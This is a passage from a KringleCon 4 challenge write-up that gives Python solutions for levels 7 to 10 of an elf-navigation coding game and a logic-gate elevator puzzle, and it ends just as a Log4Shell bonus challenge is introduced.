        
        
      
    </figcaption>
  
</figure>
<p>The constraint is to use no more than 23 lines of code and 6 object function calls. And the lever objective is that if the lever returns a boolean, return the inverse. For a number, return double the number. For a list of integers, return that list with each integer incremented by 1. For a string, return the string concatenated with itself. For a dict, return the dict with <code>a</code>&rsquo;s value + 1.</p>
<p>One solution could be:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python3" data-lang="python3"><span class="kn">import</span> <span class="nn">elf</span><span class="o">,</span> <span class="nn">munchkins</span><span class="o">,</span> <span class="nn">levers</span><span class="o">,</span> <span class="nn">lollipops</span><span class="o">,</span> <span class="nn">yeeters</span><span class="o">,</span> <span class="nn">pits</span>
<span class="c1"># Fix/Complete the below code</span>
<span class="n">lever</span> <span class="o">=</span> <span class="n">levers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">lever</span><span class="o">.</span><span class="n">data</span><span class="p">()</span>
<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;DATA:&#34;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">==</span> <span class="nb">bool</span><span class="p">:</span>
    <span class="n">data</span> <span class="o">=</span> <span class="ow">not</span> <span class="n">data</span>
<span class="k">elif</span> <span class="nb">type</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">==</span> <span class="nb">int</span><span class="p">:</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">data</span> <span class="o">*</span> <span class="mi">2</span>
<span class="k">elif</span> <span class="nb">type</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">==</span> <span class="nb">str</span><span class="p">:</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="o">+</span><span class="n">data</span>
<span class="k">elif</span> <span class="nb">type</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">==</span> <span class="nb">list</span><span class="p">:</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">[</span><span class="n">x</span><span class="o">+</span><span class="mi">1</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">data</span><span class="p">]</span>
<span class="k">elif</span> <span class="nb">type</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
    <span class="n">data</span><span class="p">[</span><span class="s2">&#34;a&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="s2">&#34;a&#34;</span><span class="p">]</span><span class="o">+</span><span class="mi">1</span>
<span class="n">elf</span><span class="o">.</span><span class="n">moveTo</span><span class="p">(</span><span class="n">lever</span><span class="o">.</span><span class="n">position</span><span class="p">)</span>
<span class="n">lever</span><span class="o">.</span><span class="n">pull</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">elf</span><span class="o">.</span><span class="n">moveUp</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><div class="alert alert-warning" role="alert" data-dir="ltr">Level 7 - Up Down Loopiness<br />
Objective - Navigate through the obstacles and collect the lollipop before arriving at the <em>KringleCon</em> entrance.</div>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi10_08.webp" alt="Level 7 map" data-caption="Level 7 map" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Level 7 map
      
        
        
      
    </figcaption>
  
</figure>
<p>The constraint is to use no more than 12 lines of code and 12 object function calls.</p>
<p>One solution could be:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python3" data-lang="python3"><span class="kn">import</span> <span class="nn">elf</span><span class="o">,</span> <span class="nn">munchkins</span><span class="o">,</span> <span class="nn">levers</span><span class="o">,</span> <span class="nn">lollipops</span><span class="o">,</span> <span class="nn">yeeters</span><span class="o">,</span> <span class="nn">pits</span>
<span class="k">for</span> <span class="n">num</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
    <span class="n">elf</span><span class="o">.</span><span class="n">moveLeft</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
    <span class="n">elf</span><span class="o">.</span><span class="n">moveUp</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span> <span class="k">if</span> <span class="n">num</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span> <span class="k">else</span> <span class="n">elf</span><span class="o">.</span><span class="n">moveDown</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><div class="alert alert-warning" role="alert" data-dir="ltr">Level 8 - Two Paths, Your Choice<br />
Objective - Navigate past the obstacles and avoid the munchkin watching the <em>KringleCon</em> entrance.</div>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi10_09.webp" alt="Level 8 map" data-caption="Level 8 map" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Level 8 map
      
        
        
      
    </figcaption>
  
</figure>
<p>The constraint is to use no more than 12 lines of code and 10 object function calls. The lever objective is to get an array and add the string <code>munchkins rule</code> as the first element. The munchkin objective is to get a dictionary object and we must return the key with a value of <code>lollipop</code>.</p>
<p>So we have 2 solutions, one involving the lever to make the munchkin fall and one only involving the munchkin.</p>
<p>Solution 1 (with lever)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python3" data-lang="python3"><span class="kn">import</span> <span class="nn">elf</span><span class="o">,</span> <span class="nn">munchkins</span><span class="o">,</span> <span class="nn">levers</span><span class="o">,</span> <span class="nn">lollipops</span><span class="o">,</span> <span class="nn">yeeters</span><span class="o">,</span> <span class="nn">pits</span>
<span class="n">all_lollipops</span> <span class="o">=</span> <span class="n">lollipops</span><span class="o">.</span><span class="n">get</span><span class="p">()</span>
<span class="n">lever</span> <span class="o">=</span> <span class="n">levers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="k">for</span> <span class="n">lollipop</span> <span class="ow">in</span> <span class="n">all_lollipops</span><span class="p">:</span>
    <span class="n">elf</span><span class="o">.</span><span class="n">moveTo</span><span class="p">(</span><span class="n">lollipop</span><span class="o">.</span><span class="n">position</span><span class="p">)</span>
<span class="n">elf</span><span class="o">.</span><span class="n">moveTo</span><span class="p">(</span><span class="n">lever</span><span class="o">.</span><span class="n">position</span><span class="p">)</span>
<span class="n">l</span> <span class="o">=</span> <span class="n">lever</span><span class="o">.</span><span class="n">data</span><span class="p">()</span>
<span class="n">l</span><span class="o">.</span><span class="n">insert</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s2">&#34;munchkins rule&#34;</span><span class="p">)</span>
<span class="n">lever</span><span class="o">.</span><span class="n">pull</span><span class="p">(</span><span class="n">l</span><span class="p">)</span>
<span class="n">elf</span><span class="o">.</span><span class="n">moveDown</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="n">elf</span><span class="o">.</span><span class="n">moveLeft</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
<span class="n">elf</span><span class="o">.</span><span class="n">moveUp</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p>Solution 2 (with munchkin)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python3" data-lang="python3"><span class="kn">import</span> <span class="nn">elf</span><span class="o">,</span> <span class="nn">munchkins</span><span class="o">,</span> <span class="nn">levers</span><span class="o">,</span> <span class="nn">lollipops</span><span class="o">,</span> <span class="nn">yeeters</span><span class="o">,</span> <span class="nn">pits</span>
<span class="n">all_lollipops</span> <span class="o">=</span> <span class="n">lollipops</span><span class="o">.</span><span class="n">get</span><span class="p">()</span>
<span class="n">munchkin</span> <span class="o">=</span> <span class="n">munchkins</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="k">for</span> <span class="n">lollipop</span> <span class="ow">in</span> <span class="n">all_lollipops</span><span class="p">:</span>
    <span class="n">elf</span><span class="o">.</span><span class="n">moveTo</span><span class="p">(</span><span class="n">lollipop</span><span class="o">.</span><span class="n">position</span><span class="p">)</span>
<span class="n">elf</span><span class="o">.</span><span class="n">moveTo</span><span class="p">(</span><span class="n">munchkin</span><span class="o">.</span><span class="n">position</span><span class="p">)</span>
<span class="n">d</span> <span class="o">=</span> <span class="n">munchkin</span><span class="o">.</span><span class="n">ask</span><span class="p">()</span>
<span class="n">munchkin</span><span class="o">.</span><span class="n">answer</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="n">d</span><span class="o">.</span><span class="n">keys</span><span class="p">())[</span><span class="nb">list</span><span class="p">(</span><span class="n">d</span><span class="o">.</span><span class="n">values</span><span class="p">())</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s2">&#34;lollipop&#34;</span><span class="p">)])</span>
<span class="n">elf</span><span class="o">.</span><span class="n">moveUp</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p>At this point we have validated the challenge, but there are optional levels!</p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Level 9 - Yeeter Swirl<br />
Objective - Follow the swirl being careful not to step on any traps (or get yeeted off the map). Note: The <code>elf.moveTo(object)</code> function has been disabled for this challenge.</div>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi10_11.webp" alt="Level 9 map" data-caption="Level 9 map" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Level 9 map
      
        
        
      
    </figcaption>
  
</figure>
<p>The constraint is to use no more than 27 lines of code and 25 object function calls. For the levers, we only need to submit the lever index each time. For the munchkin we have this objective:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi10_10.webp" alt="Munchkin objective" data-caption="Munchkin objective" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Munchkin objective
      
        
        
      
    </figcaption>
  
</figure>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python3" data-lang="python3"><span class="kn">import</span> <span class="nn">elf</span><span class="o">,</span> <span class="nn">munchkins</span><span class="o">,</span> <span class="nn">levers</span><span class="o">,</span> <span class="nn">lollipops</span><span class="o">,</span> <span class="nn">yeeters</span><span class="o">,</span> <span class="nn">pits</span>

<span class="k">def</span> <span class="nf">munchkin_func</span><span class="p">(</span><span class="n">list_of_lists</span><span class="p">):</span>
    <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">list_of_lists</span><span class="p">:</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">result</span> <span class="o">+</span> <span class="nb">sum</span><span class="p">([</span><span class="n">num</span> <span class="k">for</span> <span class="n">num</span> <span class="ow">in</span> <span class="n">l</span> <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">num</span><span class="p">,</span> <span class="nb">int</span><span class="p">)])</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">result</span>

<span class="n">all_levers</span> <span class="o">=</span> <span class="n">levers</span><span class="o">.</span><span class="n">get</span><span class="p">()</span>
<span class="n">munchkin</span> <span class="o">=</span> <span class="n">munchkins</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="c1"># Create Movement pattern:</span>
<span class="n">moves</span> <span class="o">=</span> <span class="p">[</span><span class="n">elf</span><span class="o">.</span><span class="n">moveDown</span><span class="p">,</span> <span class="n">elf</span><span class="o">.</span><span class="n">moveLeft</span><span class="p">,</span> <span class="n">elf</span><span class="o">.</span><span class="n">moveUp</span><span class="p">,</span> <span class="n">elf</span><span class="o">.</span><span class="n">moveRight</span><span class="p">]</span> <span class="o">*</span> <span class="mi">2</span>

<span class="c1"># We iterate over each move in moves getting an index (i) number that increments by one each time</span>
<span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">move</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">moves</span><span class="p">):</span>
    <span class="n">move</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">all_levers</span><span class="p">):</span>
        <span class="n">all_levers</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">pull</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
<span class="n">elf</span><span class="o">.</span><span class="n">moveUp</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="n">elf</span><span class="o">.</span><span class="n">moveLeft</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
<span class="n">munchkin</span><span class="o">.</span><span class="n">answer</span><span class="p">(</span><span class="n">munchkin_func</span><span class="p">)</span>
<span class="n">elf</span><span class="o">.</span><span class="n">moveUp</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><div class="alert alert-warning" role="alert" data-dir="ltr">Level 10 - Munchkin Dodging Finale<br />
Objective - Dodge the munchkins to get to the KringleCon entrance.</div>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi10_12.webp" alt="Level 10 map" data-caption="Level 10 map" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Level 10 map
      
        
        
      
    </figcaption>
  
</figure>
<p>We get the following hint for this one:</p>
<p>You want to move once each munchkin is the furthest grid coordinates aways on the x axis (which will be 6 for each munchkin). Use while loops and implement a conditional check using the <code>elf.position[&quot;x&quot;]</code> and <code>munchkin.position[&quot;x&quot;]</code> values to check how far away the munchkin is before using moveTo to the next lollipops position. When using while loops, use a small delay of <code>time.sleep(0.05)</code> to ensure the browser does not lock up.</p>
<p>The constraint is to use no more than 17 lines of code and 15 object function calls. The munchkins cannot be made friendly and must be avoided.</p>
<p>One solution could be:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python3" data-lang="python3"><span class="kn">import</span> <span class="nn">elf</span><span class="o">,</span> <span class="nn">munchkins</span><span class="o">,</span> <span class="nn">levers</span><span class="o">,</span> <span class="nn">lollipops</span><span class="o">,</span> <span class="nn">yeeters</span><span class="o">,</span> <span class="nn">pits</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="n">muns</span> <span class="o">=</span> <span class="n">munchkins</span><span class="o">.</span><span class="n">get</span><span class="p">()</span>
<span class="n">lols</span> <span class="o">=</span> <span class="n">lollipops</span><span class="o">.</span><span class="n">get</span><span class="p">()[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>

<span class="k">for</span> <span class="n">index</span><span class="p">,</span> <span class="n">mun</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">muns</span><span class="p">):</span>
    <span class="c1"># need to wait while absolute distance between</span>
    <span class="c1"># elf.position[&#34;x&#34;] and mun.position[&#39;x&#39;] is less than 6</span>
    <span class="c1"># then we move to next lollipop</span>
    <span class="c1"># We can use time.sleep(0.05) to add a small delay in a while loop</span>
    <span class="k">while</span> <span class="nb">abs</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">position</span><span class="p">[</span><span class="s2">&#34;x&#34;</span><span class="p">]</span> <span class="o">-</span> <span class="n">mun</span><span class="o">.</span><span class="n">position</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">])</span><span class="o">&lt;</span><span class="mi">6</span><span class="p">:</span>
        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
    <span class="n">elf</span><span class="o">.</span><span class="n">moveTo</span><span class="p">(</span><span class="n">lols</span><span class="p">[</span><span class="n">index</span><span class="p">]</span><span class="o">.</span><span class="n">position</span><span class="p">)</span>
        
<span class="n">elf</span><span class="o">.</span><span class="n">moveLeft</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
<span class="n">elf</span><span class="o">.</span><span class="n">moveUp</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p>This time we completed the whole game:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi10_13.webp" alt="Game Over" data-caption="Game Over" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Game Over
      
        
        
      
    </figcaption>
  
</figure>
<h3 id="11---frostavator">11 - Frostavator</h3>
<hr />
<table>
<thead>
<tr>
<th>Elf</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>Grody Goiterson</td>
<td>Frost Tower Lobby</td>
</tr>
</tbody>
</table>
<p>For this challenge, we have to repair the <em>Frostavator</em> to have access to all the floors of the <em>Frost Tower</em>:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi11_02.webp" alt="Frostavator" data-caption="Frostavator" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Frostavator
      
        
        
      
    </figcaption>
  
</figure>
<p>When opening the <em>Panel</em>, we access the elevator&rsquo;s main board where we see a logic circuit. The goal is to move the existing logic gates in order to illuminate the 3 outputs. From the start we have the following information (in red):</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi11_03.webp" alt="Frostvator panel" data-caption="Frostvator panel" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Frostvator panel
      
        
        
      
    </figcaption>
  
</figure>
<p>We cannot change the input values. Regarding the outputs of the different logic gates, we can refer to this diagram:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi11_04.webp" alt="Logic Gates" data-caption="Logic Gates - source: http://www.exclusivearchitecture.com/?page_id=2425" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Logic Gates - source: http://www.exclusivearchitecture.com/?page_id=2425
      
        
        
      
    </figcaption>
  
</figure>
<p>This is a possible solution:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi11_05.webp" alt="Solution" data-caption="Solution" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Solution
      
        
        
      
    </figcaption>
  
</figure>
<h3 id="12a---bonus-blue-log4jack">12a - Bonus! Blue Log4Jack</h3>
<hr />
<table>
<thead>
<tr>
<th>Elf</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>Bow Ninecandle</td>
<td>The North Pole</td>
</tr>
</tbody>
</table>
<p>This challenge and the following one have been added after the start of <em>Kringlecon 4</em> due to the <em>Log4Shell</em> vulnerabilities that were discovered as of December 9th 2021. You can refer the the <a href="https://snyk.io/log4j-vulnerability-resources/">resources created by Snyk</a> to have more information on those vulnerabilities.</p>
